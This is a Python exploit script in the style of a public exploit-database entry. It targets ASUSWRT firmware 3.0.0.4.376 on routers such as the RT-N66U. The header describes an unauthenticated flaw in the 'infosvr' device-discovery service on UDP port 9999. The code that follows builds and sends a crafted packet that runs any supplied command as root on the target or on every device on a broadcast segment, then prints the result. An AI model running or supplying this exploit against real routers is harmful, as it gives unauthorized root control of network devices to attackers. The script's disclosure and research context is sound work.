#!/usr/bin/env python3

# Exploit Title: ASUSWRT 3.0.0.4.376_1071 LAN Backdoor Command Execution
# Date: 2014-10-11
# Vendor Homepage: http://www.asus.com/
# Software Link: http://dlcdnet.asus.com/pub/ASUS/wireless/RT-N66U_B1/FW_RT_N66U_30043762524.zip
# Source code: http://dlcdnet.asus.com/pub/ASUS/wireless/RT-N66U_B1/GPL_RT_N66U_30043762524.zip
# Tested Version: 3.0.0.4.376_1071-g8696125
# Tested Device: RT-N66U

# Description:
# A service called "infosvr" listens on port 9999 on the LAN bridge.
# Normally this service is used for device discovery using the
# "ASUS Wireless Router Device Discovery Utility", but this service contains a
# feature that allows an unauthenticated user on the LAN to execute commands
# <= 237 bytes as root. Source code is in asuswrt/release/src/router/infosvr.
# "iboxcom.h" is in asuswrt/release/src/router/shared.
#
# Affected devices may also include wireless repeaters and other networking
# products, especially the ones which have "Device Discovery" in their features
# list.
#
# Using broadcast address as the IP address should work and execute the command
# on all devices in the network segment, but only receiving one response is
# supported by this script.

import sys, os, socket, struct


PORT = 9999

if len(sys.argv) < 3:
    print('Usage: ' + sys.argv[0] + ' <ip> <command>', file=sys.stderr)
    sys.exit(1)


ip = sys.argv[1]
cmd = sys.argv[2]

enccmd = cmd.encode()

if len(enccmd) > 237:
    # Strings longer than 237 bytes cause the buffer to overflow and possibly crash the server. 
    print('Values over 237 will give rise to undefined behaviour.', file=sys.stderr)
    sys.exit(1)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(('0.0.0.0', PORT))
sock.settimeout(2)

# Request consists of following things
# ServiceID     [byte]      ; NET_SERVICE_ID_IBOX_INFO
# PacketType    [byte]      ; NET_PACKET_TYPE_CMD
# OpCode        [word]      ; NET_CMD_ID_MANU_CMD
# Info          [dword]     ; Comment: "Or Transaction ID"
# MacAddress    [byte[6]]   ; Double-wrongly "checked" with memcpy instead of memcmp
# Password      [byte[32]]  ; Not checked at all
# Length        [word]
# Command       [byte[420]] ; 420 bytes in struct, 256 - 19 unusable in code = 237 usable

packet = (b'\x0C\x15\x33\x00' + os.urandom(4) + (b'\x00' * 38) + struct.pack('<H', len(enccmd)) + enccmd).ljust(512, b'\x00')

sock.sendto(packet, (ip, PORT))


# Response consists of following things
# ServiceID     [byte]      ; NET_SERVICE_ID_IBOX_INFO
# PacketType    [byte]      ; NET_PACKET_TYPE_RES
# OpCode        [word]      ; NET_CMD_ID_MANU_CMD
# Info          [dword]     ; Equal to Info of request
# MacAddress    [byte[6]]   ; Filled in for us
# Length        [word]
# Result        [byte[420]] ; Actually returns that amount

while True:
    data, addr = sock.recvfrom(512)

    if len(data) == 512 and data[1] == 22:
        break

length = struct.unpack('<H', data[14:16])[0]
s = slice(16, 16+length)
sys.stdout.buffer.write(data[s])

sock.close()
